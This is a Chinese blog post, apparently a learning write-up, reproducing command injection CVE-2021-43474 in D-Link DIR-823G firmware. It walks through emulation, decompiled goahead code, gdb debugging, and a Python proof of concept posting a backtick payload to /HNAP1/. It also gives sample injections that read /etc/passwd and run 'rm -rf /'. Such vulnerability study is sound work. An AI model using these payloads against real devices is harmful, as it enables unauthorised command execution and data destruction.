@@ -1,0 +1,398 @@
+<!DOCTYPE html><html lang="zh-Hans" data-theme="dark"> <head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>dir823g | 沉于思，录以隙</title><meta name="description" content="**环境** • 虚拟机：Ubuntu20.04 • 固件版本：[D-Link DIR-823G firmware version 1.02B05](https://download.csdn.net/download/The54No1/88343197?spm=1001.201"><link rel="icon" type="image/svg+xml" href="/favicon.svg"><link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link href="https://fonts.googleapis.com/css2?family=Playfair+Display:wght@400;500;600;700&family=Zhi+Mang+Xing&family=Noto+Serif+SC:wght@400;500;700&family=Inter:wght@400;500;600&display=swap" rel="stylesheet"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.16.11/dist/katex.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@11.11.1/styles/github-dark.min.css"><link rel="stylesheet" href="/_astro/_folder_.k9dOAKhk.css"></head> <body class="is-post-page"> <div class="deep-space-container" id="deep-space-bg" aria-hidden="true" data-astro-cid-nnyeyk4f> <div class="ds-nebula" data-astro-cid-nnyeyk4f></div> <canvas class="ds-stars" id="ds-canvas" data-astro-cid-nnyeyk4f></canvas> <div class="ds-grid" data-astro-cid-nnyeyk4f></div> <div class="ds-noise" data-astro-cid-nnyeyk4f></div> </div> <script type="module">let r;function o(){const e=document.getElementById("ds-canvas");if(!e)return;const i=e.getContext("2d");if(!i)return;let a=e.width=window.innerWidth,n=e.height=window.innerHeight,h=Array.from({length:250},()=>({x:Math.random()*a,y:Math.random()*n,z:Math.random()*2+.1,opacity:Math.random()*.8+.1,pulse:Math.random()*.01,pulseDir:Math.random()>.5?1:-1}));r&&cancelAnimationFrame(r);const d=()=>{i.clearRect(0,0,a,n),h.forEach(t=>{t.opacity+=t.pulse*t.pulseDir;const c=.8;t.opacity>=c&&(t.opacity=c,t.pulseDir=-1),t.opacity<=.05&&(t.opacity=.05,t.pulseDir=1),i.fillStyle=`rgba(226, 232, 240, ${t.opacity})`,i.beginPath(),i.arc(t.x,t.y,t.z*.9,0,Math.PI*2),i.fill(),t.x-=.15/t.z,t.y-=.05/t.z,t.x<0&&(t.x=a),t.y<0&&(t.y=n)}),r=requestAnimationFrame(d)};d(),window.addEventListener("resize",()=>{a=e.width=window.innerWidth,n=e.height=window.innerHeight})}document.addEventListener("astro:page-load",o);document.readyState==="complete"?o():window.addEventListener("load",o);</script>  <header class="topbar topbar-post"> <a class="brand" href="/">沉于思，录以隙</a> <nav class="nav-links"> <a href="/" class>首页</a> <a href="/folders" class>目录</a> <a href="/tags" class>标签</a> <a href="/#archive-search">搜索</a> </nav> </header> <main id="main-content" class="page-shell page-main is-post-main">  <section class="post-cover-hero"> <div class="post-cover-hero__inner"> <p class="post-cover-hero__eyebrow">车联网</p> <h1 class="post-cover-hero__title">dir823g</h1> </div> </section> <div class="article-shell" id="article-shell"> <a class="back-link" href="/">&larr; 返回首页花园</a> <div class="article-layout"> <article class="article-panel"> <header class="article-header"> <div class="article-directory"> <a href="/folders" class="directory-link">目录</a>  <span class="directory-sep">/</span> <a href="/folders/车联网/" class="directory-link">车联网</a>   <span class="directory-sep">/</span> <span class="directory-text">路由器</span>  </div> <div class="article-meta-row"> <span>2025/12/12</span> <span>车联网</span> <span>车联网 · 路由器</span> </div> <div class="tag-row article-header__tags"> <a href="/tags/车联网/" class="tag">#车联网</a><a href="/tags/路由器/" class="tag">#路由器</a> </div> <p class="source-note">来源路径：车联网/路由器/dir823g.md</p> </header> <div class="article-main"> <div class="article-content"><p><strong>环境</strong>
+• 虚拟机：Ubuntu20.04
+• 固件版本：<a href="https://download.csdn.net/download/The54No1/88343197?spm=1001.2014.3001.5503">D-Link DIR-823G firmware version 1.02B05</a>
+• 工具：IDA、binwalk、Firmae</p>
+<h1>漏洞原理</h1><p>CVE-2021-43474  ,D-Link DIR-823G v1.02 B05及之前的版本存在命令注入漏洞，攻击者可以通过POST的方式往 /HNAP1发送精心构造的请求，执行任意的操作系统命令。</p>
+<h1>固件仿真</h1><p>工具firmeae，开始仿真</p>
+<pre><code><span class="hljs-built_in">sudo</span> ./run.sh -d Dlink <span class="hljs-string">&quot;/mnt/hgfs/share/DIR-823G漏洞复现(CVE-2023-26612)/DIR823G_V1.0.2B05_20181207.bin&quot;</span>
+</code></pre>
+<p>输入192.168.0.1验证仿真。</p>
+<p><img src="../../../%E5%9B%BE%E5%BA%93/image-20250502170833146.png" alt="image-20250502170833146"></p>
+<h1>提取固件并分析二进制文件</h1><p>提取固件</p>
+<pre><code class="language-python">binwalk -Me DIR823G_V1<span class="hljs-number">.0</span><span class="hljs-number">.2</span>B05_20181207.<span class="hljs-built_in">bin</span>
+</code></pre>
+<h2 id="section-1">查看启动项</h2><p>我们现在假设我们是分析一个未知固件，我们就得先知道这个固件有哪些应用，启动了哪些服务，最清晰和简便的方式就是去看我们etc文件下面，里面有个叫init.d的目录，里面是关于启动项的内容。有2文件rcs和rsc_gw</p>
+<p>我们首先来看rcS下面的内容</p>
+<p>首先是设置ip，然后挂载了两个文件系统分别是proc，这是与进程相关的文件系统，包括当前进程启动存放在哪个地址。</p>
+<pre><code>mount 命令是 Linux 和类 Unix 系统中用于挂载文件系统的核心命令，它能将存储设备（如硬盘分区、U 盘、光盘等）或网络资源（如 NFS 共享）关联到系统的目录树中，使这些资源可以通过该目录（称为 “挂载点”）被访问。
+</code></pre>
+<p>还有ramfs文件系统跟RAM相关。</p>
+<p>然后下面就是判断是否还有挂载别的文件系统。</p>
+<p>然后mkdir就是创建各种各样的文件夹，都有对应的功能，比如说创建了pptp文件夹，针对拨号上网的功能，然后还有smbd服务，可以看到创建了一个usb的文件夹，说明该固件有可以跟usb也就是U盘相关的操作，接下来都是一些配置信息。</p>
+<p><img src="../../../%E5%9B%BE%E5%BA%93/image-20250503164753639.png" alt="image-20250503164753639"></p>
+<p>继续往下翻</p>
+<p>可以看到该固件启动了web server的web服务，也就是httpd的内容，这里启动的是goahead，通过这个名字，我们可以确定web服务就是goahead，如果想要分析web服务的话，就直接分析goahead就可以。</p>
+<p>路由器使用 Web Server（Web 服务器）主要是为了简化用户对路由器的配置、管理和监控过程，让普通用户无需专业技术也能轻松操作。具体原因如下：</p>
+<h3 id="section-2">1. <strong>提供直观的图形化管理界面</strong></h3><p>路由器的核心功能（如网络参数设置、Wi-Fi 配置、端口映射、防火墙规则等）需要用户进行配置，但路由器的底层系统（通常是嵌入式 Linux）依赖命令行操作，门槛极高。
+Web Server 允许路由器通过 HTTP 协议提供<strong>Web 管理界面</strong>（即用户在浏览器中输入路由器 IP 地址访问的页面，如<code>192.168.1.1</code>），将复杂的配置逻辑转化为可视化的按钮、表单和菜单，用户只需通过鼠标点击即可完成设置，大幅降低了使用难度。</p>
+<h3 id="section-3">2. <strong>跨设备、跨平台的访问便利性</strong></h3><p>Web Server 基于 HTTP 协议工作，而几乎所有设备（电脑、手机、平板等）都内置浏览器，且支持 HTTP 协议。
+这意味着用户无需安装专用管理软件，只需在任何联网设备的浏览器中输入路由器 IP，即可访问管理界面，实现<strong>跨设备、跨系统（Windows、macOS、iOS、Android 等）的统一管理</strong>，避免了软件兼容性问题。</p>
+<h3 id="section-4">3. <strong>轻量化设计适配路由器硬件限制</strong></h3><p>路由器属于嵌入式设备，硬件资源（CPU、内存、存储）通常有限，无法运行复杂的管理软件。
+路由器内置的 Web Server（如 uHTTPd、lighttpd 等）经过专门优化，体积小、资源占用低，能在有限硬件条件下高效运行，仅处理配置相关的 HTTP 请求，无需支持复杂的动态内容或高并发场景，与路由器的硬件特性完美匹配。</p>
+<p><img src="../../../%E5%9B%BE%E5%BA%93/image-20250503164949163.png" alt="image-20250503164949163"></p>
+<p>在squashfs-root目录找goahead</p>
+<pre><code class="language-bash">iot@attifyos ~/f/_/squashfs-root&gt; grep -ir <span class="hljs-string">&quot;goahead&quot;</span> .
+./etc/init.d/rcS:goahead &amp;
+./etc/init.d/rcS_GW:goahead &amp;
+Binary file ./bin/mtn_upgrade matches
+Binary file ./bin/goahead matches       <span class="hljs-comment">#这里</span>
+Binary file ./bin/timelycheck matches
+</code></pre>
+<p>GoAhead ，它是一个源码,免费、功能强大、可以在多个平台运行的嵌入式WebServer。</p>
+<p>goahead的websUrlHandlerDefine函数允许用户自定义不同url的处理函数。</p>
+<p>它在进行编写与它相关的请求，是通过websUrlHandlerDefine来确定的。</p>
+<pre><code><span class="hljs-built_in">websUrlHandlerDefine</span>(<span class="hljs-built_in">T</span>(<span class="hljs-string">&quot;/HNAP1&quot;</span>)，<span class="hljs-literal">NULL</span>,<span class="hljs-number">0</span>, websHNAPHandler,<span class="hljs-number">0</span>);
+<span class="hljs-built_in">websUrlHandlerDefine</span>(<span class="hljs-built_in">T</span>(<span class="hljs-string">&quot;/goform&quot;</span>)，<span class="hljs-literal">NULL</span>,<span class="hljs-number">0</span>, websFormHandler,<span class="hljs-number">0</span>);
+<span class="hljs-built_in">websUrlHandlerDefine</span>(<span class="hljs-built_in">T</span>(<span class="hljs-string">&quot;/cgi.bin&quot;</span>)，<span class="hljs-literal">NULL</span>,<span class="hljs-number">0</span>, websCgiHandler,<span class="hljs-number">0</span>);
+</code></pre>
+<h2 id="section-5">分析gohead</h2><p>ida分析gohead，shift+f12搜HNAP1，第一个ctrl+x找到调用函数，在sub_423F90函数中发现/HNAP1路径的处理程序为sub_42383C函数。</p>
+<pre><code><span class="hljs-title class_">HNAP1</span>（<span class="hljs-title class_">Home</span> <span class="hljs-title class_">Network</span> <span class="hljs-title class_">Administration</span> <span class="hljs-title class_">Protocol</span> <span class="hljs-number">1</span>，家庭网络管理协议 <span class="hljs-number">1</span>）是一种基于 <span class="hljs-variable constant_">SOAP</span>（<span class="hljs-title class_">Simple</span> <span class="hljs-title class_">Object</span> <span class="hljs-title class_">Access</span> <span class="hljs-title class_">Protocol</span>）的轻量级协议，主要用于家庭网络设备（如路由器、调制解调器、<span class="hljs-variable constant_">IP</span> 摄像头等）与客户端（如 <span class="hljs-title class_">Web</span> 浏览器、移动应用）之间的通信和管理。它由微软开发并推广，旨在简化家庭网络设备的远程管理，已被多家网络设备厂商（如 <span class="hljs-title class_">Linksys</span>、<span class="hljs-title class_">Netgear</span>、<span class="hljs-variable constant_">TP</span>-<span class="hljs-title class_">Link</span> 等）广泛采用。
+</code></pre>
+<pre><code class="language-c">    sub_40B1F4(<span class="hljs-string">&quot;/HNAP1&quot;</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, sub_42383C, <span class="hljs-number">0</span>); <span class="hljs-comment">//这里</span>
+    sub_40B1F4(<span class="hljs-string">&quot;/goform&quot;</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, sub_40A810, <span class="hljs-number">0</span>);
+    sub_40B1F4(<span class="hljs-string">&quot;/cgi-bin&quot;</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, sub_403D00, <span class="hljs-number">0</span>);
+    sub_40B1F4(<span class="hljs-string">&quot;/EXCU_SHELL&quot;</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, sub_4234CC, <span class="hljs-number">0</span>);
+    sub_40B1F4(&amp;dword_4A3C4C, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, sub_404940, <span class="hljs-number">2</span>);
+</code></pre>
+<p>sub_42383C函数的第31行代码使用参数a7作为系统命令的一部分，然后第32行代码执行了这个命令，值得注意的是该函数在执行命令前并未对参数a7进行检查。</p>
+<pre><code class="language-c">        <span class="hljs-built_in">snprintf</span>(&amp;v11[<span class="hljs-number">27</span>], <span class="hljs-number">4999</span>, <span class="hljs-string">&quot;echo &#x27;%s&#x27; &gt;/var/hnaplog&quot;</span>, a7); <span class="hljs-comment">//这里</span>
+        system(&amp;v11[<span class="hljs-number">27</span>]);  <span class="hljs-comment">//命令注入</span>
+</code></pre>
+<p>这里就是漏洞点，这里执行了memset和snprintf，一般来说这里应该是不存在漏洞点，但是下面一条语句是system，也就是把格式化化的字符串直接就拿到了system函数作为参数传递进去，而snprintf这里的参数有个echo，有个单引号的命令注入问题。</p>
+<h3 id="section-6">命令注入</h3><p><code>snprintf</code> 中使用了：</p>
+<pre><code class="language-c"><span class="hljs-string">&quot;echo &#x27;%s&#x27; &gt;/var/hnaplog&quot;</span>, a7  
+</code></pre>
+<p>由于只是简单地用单引号包裹 <code>a7</code> 的内容，<strong>并没有进行任何转义或过滤</strong>，攻击者可以通过构造输入中的单引号 <code>&#39;</code> 来突破这个包裹，从而注入新的命令。</p>
+<hr>
+<h4>🧪 示例攻击</h4><p>假设用户输入的 <code>a7</code> 是：</p>
+<pre><code class="language-c">abc<span class="hljs-string">&#x27;; cat /etc/passwd; echo &#x27;</span>
+</code></pre>
+<p>生成的命令是：</p>
+<pre><code class="language-c">echo <span class="hljs-string">&#x27;abc&#x27;</span>; cat /etc/passwd; echo <span class="hljs-string">&#x27;&#x27; &gt;/var/hnaplog</span>
+</code></pre>
+<p>这将执行：</p>
+<ul>
+<li><code>echo &#39;abc&#39;</code></li>
+<li><code>cat /etc/passwd</code>  → 泄露敏感信息</li>
+<li><code>echo &#39;&#39; &gt;/var/hnaplog</code> → 清空日志</li>
+</ul>
+<p>所以，如果我们构造一些恶意的代码写入到snprintf中，再传递到system函数，就会造成命令注入漏洞。</p>
+<pre><code class="language-c"><span class="hljs-type">int</span> __fastcall <span class="hljs-title function_">sub_42383C</span><span class="hljs-params">(<span class="hljs-type">int</span> a1, <span class="hljs-type">int</span> a2, <span class="hljs-type">int</span> a3, <span class="hljs-type">int</span> a4, <span class="hljs-type">int</span> a5, <span class="hljs-type">int</span> a6, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *a7)</span>
+{
+  <span class="hljs-type">int</span> v8; <span class="hljs-comment">// [sp+34h] [+34h]</span>
+  <span class="hljs-type">int</span> v9; <span class="hljs-comment">// [sp+38h] [+38h]</span>
+  <span class="hljs-type">int</span> v10; <span class="hljs-comment">// [sp+40h] [+40h]</span>
+  <span class="hljs-type">int</span> v11[<span class="hljs-number">1277</span>]; <span class="hljs-comment">// [sp+4Ch] [+4Ch] BYREF</span>
+
+  v10 = <span class="hljs-number">0</span>;
+  <span class="hljs-built_in">strcpy</span>(
+    v11,
+    <span class="hljs-string">&quot;HTTP/1.0 200 OK\r\nContent-Type: text/html; charset=utf-8\r\nConnection: close\r\nCache-Control: private\r\n\r\n&quot;</span>);
+  v9 = <span class="hljs-number">0</span>;
+  v11[<span class="hljs-number">26</span>] = <span class="hljs-number">0</span>;
+  dword_58A6C0 = a1;
+  v8 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">10240</span>);
+  <span class="hljs-keyword">if</span> ( v8 )
+  {
+    <span class="hljs-built_in">memset</span>(v8, <span class="hljs-number">0</span>, <span class="hljs-number">10240</span>);
+    v9 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">51200</span>);
+    <span class="hljs-keyword">if</span> ( v9 )
+    {
+      <span class="hljs-built_in">memset</span>(v9, <span class="hljs-number">0</span>, <span class="hljs-number">51200</span>);
+      <span class="hljs-keyword">if</span> ( *(a1 + <span class="hljs-number">1316</span>) )
+      {
+        apmib_get(<span class="hljs-number">7011</span>, &amp;v11[<span class="hljs-number">26</span>]);
+        <span class="hljs-keyword">for</span> ( dword_58A6C4 = &amp;off_588D80; *dword_58A6C4; dword_58A6C4 += <span class="hljs-number">8</span> )
+        {
+          <span class="hljs-keyword">if</span> ( <span class="hljs-built_in">strstr</span>(*(a1 + <span class="hljs-number">1316</span>), *dword_58A6C4) )
+          {
+            <span class="hljs-built_in">memset</span>(&amp;v11[<span class="hljs-number">27</span>], <span class="hljs-number">0</span>, <span class="hljs-number">5000</span>);
+            <span class="hljs-built_in">snprintf</span>(&amp;v11[<span class="hljs-number">27</span>], <span class="hljs-number">4999</span>, <span class="hljs-string">&quot;echo &#x27;%s&#x27; &gt;/var/hnaplog&quot;</span>, a7); <span class="hljs-comment">//这里</span>
+            system(&amp;v11[<span class="hljs-number">27</span>]);  <span class="hljs-comment">//命令注入</span>
+            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;wp-&gt;hnapfunc===========&gt;%s\n&quot;</span>, *(a1 + <span class="hljs-number">1316</span>));
+            <span class="hljs-keyword">if</span> ( !<span class="hljs-built_in">strncmp</span>(*dword_58A6C4, <span class="hljs-string">&quot;GetLocalMac&quot;</span>, <span class="hljs-number">11</span>) )
+            {
+              <span class="hljs-built_in">memset</span>(&amp;qword_58A6A0, <span class="hljs-number">0</span>, <span class="hljs-number">32</span>);
+              <span class="hljs-built_in">strncpy</span>(&amp;qword_58A6A0, a1 + <span class="hljs-number">48</span>, <span class="hljs-number">32</span>);c
+            }
+</code></pre>
+<h3 id="section-7">命令替换</h3><p>（<strong>Command Substitution</strong>）是 <strong>Shell（如 bash）的一种语法机制</strong>，用于<strong>先执行一条命令，然后把输出结果插入到命令中原来的位置</strong>。</p>
+<h4>输入：</h4><pre><code class="language-c">echo <span class="hljs-string">&quot;Today is `date`&quot;</span>
+</code></pre>
+<h4>Shell 执行步骤：</h4><ol>
+<li>先执行 <code>date</code> 命令，比如输出是 <code>Sun May 11 20:00:00 UTC 2025c</code></li>
+<li>最终命令变为：</li>
+</ol>
+<pre><code class="language-c">echo <span class="hljs-string">&quot;Today is Sun May 11 20:00:00 UTC 2025&quot;</span>
+</code></pre>
+<hr>
+<h4>在注入中的危险</h4><p>如果你把用户输入原封不动传给 shell（比如 <code>system()</code>），攻击者可以这样注入：</p>
+<pre><code class="language-c"><span class="hljs-string">&#x27;`rm -rf /`&#x27;</span>
+</code></pre>
+<p>Shell 会执行：</p>
+<pre><code class="language-c">echo <span class="hljs-string">&#x27;`rm -rf /`&#x27;</span> &gt; file
+</code></pre>
+<p>命令替换发生，<code>rm -rf /</code> 被执行，后果灾难性。</p>
+<h2 id="section-8">gdb动调</h2><p>选项4进入调试</p>
+<pre><code class="language-python">gdb-multiarch
+
+<span class="hljs-comment">#然后gdb内</span>
+<span class="hljs-built_in">set</span> architecture mips
+<span class="hljs-built_in">set</span> follow-fork-mode child  <span class="hljs-comment">#如果程序调用了 fork() 或 vfork()，GDB 会跟踪子进程，而不是父进程。</span>
+<span class="hljs-built_in">set</span> detach-on-fork off <span class="hljs-comment">#默认情况下，如果程序 fork() 了，GDB 只会调试你选择的那一个进程，自动让另一个进程“脱离调试”。这条命令的作用是:不要自动 detach 掉另一个进程，两个进程都保持被 GDB 附着（即便只调试其中一个，也能随时切换）。</span>
+target remote <span class="hljs-number">192.168</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>:<span class="hljs-number">1337</span>
+
+b *<span class="hljs-number">0x423A04</span>
+c 
+</code></pre>
+<p>寄存器$a3对应参数a7。</p>
+<p>可以观察到寄存器$a3指向post请求数据。即post请求数据作为系统命令的一部分，因此可以通过构造HTTP请求进行命令注入。</p>
+<h1>漏洞验证</h1><pre><code class="language-python"><span class="hljs-keyword">import</span> requests
+
+ip=<span class="hljs-string">&#x27;192.168.0.1&#x27;</span>
+
+command=<span class="hljs-string">&quot;&#x27;`echo aaaaaaaaa &gt; /web_mtn/test.txt`&#x27;&quot;</span>
+length=<span class="hljs-built_in">len</span>(command)
+
+headers=requests.utils.default_headers()
+headers[<span class="hljs-string">&quot;Content-Length&quot;</span>]=<span class="hljs-built_in">str</span>(length)
+headers[<span class="hljs-string">&quot;User-Agent&quot;</span>]=<span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36&quot;</span>
+headers[<span class="hljs-string">&quot;SOAPAction&quot;</span>]=<span class="hljs-string">&#x27;&quot;http://purenetworks.com/HNAP1/GetClientInfo&quot;&#x27;</span>
+headers[<span class="hljs-string">&quot;Content-Type&quot;</span>]=<span class="hljs-string">&quot;text/xml; charset=UTF-8&quot;</span>
+headers[<span class="hljs-string">&quot;Accept&quot;</span>]=<span class="hljs-string">&quot;*/*&quot;</span>
+headers[<span class="hljs-string">&quot;Accept-Encoding&quot;</span>]=<span class="hljs-string">&quot;gzip, deflate&quot;</span>
+headers[<span class="hljs-string">&quot;Accept-Language&quot;</span>]=<span class="hljs-string">&quot;zh-CN,zh;q=0.9,en;q=0.8&quot;</span>
+
+payload=command
+r=requests.post(<span class="hljs-string">&#x27;http://&#x27;</span>+ip+<span class="hljs-string">&#x27;/HNAP1/&#x27;</span>, headers=headers, data=payload)
+</code></pre>
+<p>输入</p>
+<pre><code class="language-c"><span class="hljs-string">&#x27;`echo aaaaaaaaa &gt; /web_mtn/test.txt`&#x27;</span>
+</code></pre>
+<p>会被拼接为：</p>
+<pre><code class="language-c">echo <span class="hljs-string">&#x27;&#x27;`echo aaaaaaaaa &gt; /web_mtn/test.txt`&#x27;</span><span class="hljs-string">&#x27; &gt;/var/hnaplog</span>
+</code></pre>
+<p>在 shell 中，这段命令解释如下：</p>
+<p>1. </p>
+<pre><code class="language-c">反引号 `...` 是命令替换，会执行 echo aaaaaaaaa &gt; /web_mtn/test.txt。
+</code></pre>
+<ol start="2">
+<li><p>所以 <code>aaaaaaaaa</code> 会被写入到 <code>/web_mtn/test.txt</code>。无返回值</p>
+</li>
+<li><p>然后主命令变为：</p>
+<pre><code class="language-c">echo <span class="hljs-string">&#x27;&#x27; &#x27;</span><span class="hljs-string">&#x27; &gt;/var/hnaplog  </span>
+</code></pre>
+</li>
+</ol>
+<p>这只是将空字符串写入日志，但攻击的真正 payload（写入 <code>/web_mtn/test.txt</code>）已经生效了！</p>
+<p>浏览器访问发现内容被写入</p>
+<p><img src="../../../%E5%9B%BE%E5%BA%93/image-20250503172232439.png" alt="image-20250503172232439"></p>
+<h1>参考</h1><p><a href="https://www.secpulse.com/archives/206007.html">https://www.secpulse.com/archives/206007.html</a></p>
+<p><a href="https://www.freebuf.com/articles/vuls/360215.html">https://www.freebuf.com/articles/vuls/360215.html</a></p>
+</div> <nav class="article-nav" style="display: flex; justify-content: space-between; margin-top: 64px; padding-top: 32px; border-top: 1px solid var(--line);"> <div class="nav-prev" style="flex: 1;"> <a href="/posts/车联网/ble/gatt协议/" style="text-decoration: none;"> <p class="muted" style="margin: 0; font-size: 0.9rem; color: var(--muted);">&larr; 上一篇</p> <h4 style="margin: 8px 0 0; color: var(--ink);">gatt协议</h4> </a> </div> <div class="nav-next" style="flex: 1; text-align: right;"> <a href="/posts/车联网/路由器/dir-815/" style="text-decoration: none;"> <p class="muted" style="margin: 0; font-size: 0.9rem; color: var(--muted);">下一篇 &rarr;</p> <h4 style="margin: 8px 0 0; color: var(--ink);">dir-815</h4> </a> </div> </nav> </div> </article>  <aside class="article-sidebar" id="article-sidebar"> <nav class="article-outline" aria-label="文章目录"> <div class="article-outline__head"> <strong>目录</strong> </div> <div class="article-outline__body"> <ol class="article-outline__list article-outline__list--groups"> <li class="article-outline__group" data-group-id="section-1"> <button class="article-outline__group-link" type="button" data-group-target="section-1"> <span>查看启动项</span> <span class="article-outline__group-caret" aria-hidden="true">›</span> </button> <ol class="article-outline__sublist"> <li class="article-outline__item depth-3" data-toc-id="section-2"> <a href="#section-2">1. 提供直观的图形化管理界面</a> </li><li class="article-outline__item depth-3" data-toc-id="section-3"> <a href="#section-3">2. 跨设备、跨平台的访问便利性</a> </li><li class="article-outline__item depth-3" data-toc-id="section-4"> <a href="#section-4">3. 轻量化设计适配路由器硬件限制</a> </li> </ol> </li><li class="article-outline__group" data-group-id="section-5"> <button class="article-outline__group-link" type="button" data-group-target="section-5"> <span>分析gohead</span> <span class="article-outline__group-caret" aria-hidden="true">›</span> </button> <ol class="article-outline__sublist"> <li class="article-outline__item depth-3" data-toc-id="section-6"> <a href="#section-6">命令注入</a> </li><li class="article-outline__item depth-3" data-toc-id="section-7"> <a href="#section-7">命令替换</a> </li> </ol> </li><li class="article-outline__group" data-group-id="section-8"> <button class="article-outline__group-link" type="button" data-group-target="section-8"> <span>gdb动调</span>  </button>  </li> </ol> </div> </nav> </aside>  </div> </div>  </main> <script>
+      (() => {
+        const root = document.documentElement;
+        const scrollFlagKey = "scroll-to-top-once";
+
+        const bindScrollReset = () => {
+          try {
+            if ("scrollRestoration" in history) {
+              history.scrollRestoration = "manual";
+            }
+
+            if (sessionStorage.getItem(scrollFlagKey) === "1") {
+              sessionStorage.removeItem(scrollFlagKey);
+              requestAnimationFrame(() => window.scrollTo({ top: 0, left: 0, behavior: "auto" }));
+            }
+          } catch {}
+
+          document.addEventListener("click", (event) => {
+            const target = event.target;
+            if (!(target instanceof Element)) return;
+
+            const link = target.closest("a");
+            if (!(link instanceof HTMLAnchorElement)) return;
+
+            if (link.target && link.target !== "_self") return;
+            if (link.hasAttribute("download")) return;
+
+            const href = link.getAttribute("href");
+            if (!href || href.startsWith("#")) return;
+
+            try {
+              const url = new URL(link.href, window.location.href);
+              if (url.origin !== window.location.origin) return;
+              if (url.pathname === window.location.pathname && url.hash) return;
+              sessionStorage.setItem(scrollFlagKey, "1");
+            } catch {}
+          });
+        };
+
+        bindScrollReset();
+      })();
+    </script> </body> </html>  <script>
+      (() => {
+        const shell = document.getElementById("article-shell");
+        const sidebar = document.getElementById("article-sidebar");
+        const outlineNav = document.querySelector(".article-outline__body");
+        const headings = Array.from(document.querySelectorAll(".article-content h2[id], .article-content h3[id]"));
+        const groupLinks = Array.from(document.querySelectorAll(".article-outline__group-link"));
+        const childLinks = Array.from(document.querySelectorAll(".article-outline__sublist a"));
+
+        if (!shell || !sidebar || !outlineNav || !headings.length || !groupLinks.length) return;
+
+        let activeId = "";
+        let activeGroupId = "";
+        let manualOpenGroupId = "";
+        let ticking = false;
+        let suppressOutlineScrollUntil = 0;
+
+        const groupMap = new Map(
+          groupLinks.map((link) => {
+            const id = link.getAttribute("data-group-target") || "";
+            return [id, link.closest(".article-outline__group")];
+          }),
+        );
+
+        let lastH2Id = "";
+        const headingMeta = headings.map((heading) => {
+          const depth = Number(heading.tagName.slice(1));
+          if (depth === 2) lastH2Id = heading.id;
+          return {
+            id: heading.id,
+            depth,
+            parentId: depth === 3 ? lastH2Id : "",
+            element: heading,
+          };
+        });
+
+        const pauseOutlineAutoScroll = (duration = 900) => {
+          suppressOutlineScrollUntil = Date.now() + duration;
+        };
+
+        const setActive = (id, parentId = "") => {
+          if (!id || (id === activeId && parentId === activeGroupId)) return;
+
+          activeId = id;
+          activeGroupId = parentId || id;
+
+          groupLinks.forEach((link) => {
+            const targetId = link.getAttribute("data-group-target") || "";
+            const isCurrentGroup = targetId === activeGroupId;
+            const isOpenGroup = targetId === activeGroupId || targetId === manualOpenGroupId;
+            link.toggleAttribute("aria-current", targetId === id && !parentId);
+            link.classList.toggle("is-current", targetId === id && !parentId);
+            link.classList.toggle("is-open", isOpenGroup);
+            link.classList.toggle("is-active-group", isCurrentGroup);
+          });
+
+          childLinks.forEach((link) => {
+            const targetId = decodeURIComponent((link.getAttribute("href") || "").replace(/^#/, ""));
+            const isCurrent = targetId === id;
+            link.toggleAttribute("aria-current", isCurrent);
+            link.classList.toggle("is-current", isCurrent);
+          });
+
+          groupMap.forEach((group, groupId) => {
+            if (!group) return;
+            group.classList.toggle("is-open", groupId === activeGroupId || groupId === manualOpenGroupId);
+            group.classList.toggle("is-current", groupId === id && !parentId);
+          });
+
+          if (Date.now() < suppressOutlineScrollUntil) return;
+
+          const activeLink = [...groupLinks, ...childLinks].find((link) => {
+            const href = link.getAttribute("href");
+            if (href) return decodeURIComponent(href.replace(/^#/, "")) === id;
+            return (link.getAttribute("data-group-target") || "") === id;
+          });
+          if (!activeLink) return;
+
+          const linkTop = activeLink.offsetTop;
+          const linkBottom = linkTop + activeLink.offsetHeight;
+          const viewTop = outlineNav.scrollTop;
+          const viewBottom = viewTop + outlineNav.clientHeight;
+          const padding = 24;
+
+          if (linkTop - padding < viewTop) {
+            outlineNav.scrollTo({ top: Math.max(linkTop - padding, 0), behavior: "smooth" });
+          } else if (linkBottom + padding > viewBottom) {
+            outlineNav.scrollTo({
+              top: linkBottom - outlineNav.clientHeight + padding,
+              behavior: "smooth",
+            });
+          }
+        };
+
+        const updateOutline = () => {
+          ticking = false;
+
+          let current = headingMeta[0];
+          for (const heading of headingMeta) {
+            if (heading.element.getBoundingClientRect().top <= 160) {
+              current = heading;
+            } else {
+              break;
+            }
+          }
+
+          if (current) {
+            setActive(current.id, current.parentId);
+          }
+        };
+
+        const requestUpdate = () => {
+          if (ticking) return;
+          ticking = true;
+          window.requestAnimationFrame(updateOutline);
+        };
+
+        groupLinks.forEach((button) => {
+          button.addEventListener("click", (event) => {
+            event.stopPropagation();
+            const groupId = button.getAttribute("data-group-target") || "";
+            if (!groupId) return;
+
+            if (manualOpenGroupId === groupId) {
+              manualOpenGroupId = "";
+            } else {
+              manualOpenGroupId = groupId;
+            }
+
+            if (activeGroupId) {
+              setActive(activeId || activeGroupId, activeGroupId);
+            }
+
+            const targetHeading = document.getElementById(groupId);
+            targetHeading?.scrollIntoView({ behavior: "smooth", block: "start" });
+          });
+        });
+
+        childLinks.forEach((link) => {
+          link.addEventListener("click", (event) => {
+            event.preventDefault();
+            event.stopPropagation();
+
+            const targetId = decodeURIComponent((link.getAttribute("href") || "").replace(/^#/, ""));
+            if (!targetId) return;
+
+            const targetMeta = headingMeta.find((item) => item.id === targetId);
+            if (!targetMeta) return;
+
+            pauseOutlineAutoScroll(1200);
+            setActive(targetMeta.id, targetMeta.parentId);
+
+            if (location.hash !== `#${targetId}`) {
+              history.pushState(null, "", `#${targetId}`);
+            }
+
+            targetMeta.element.scrollIntoView({ behavior: "smooth", block: "start" });
+          });
+        });
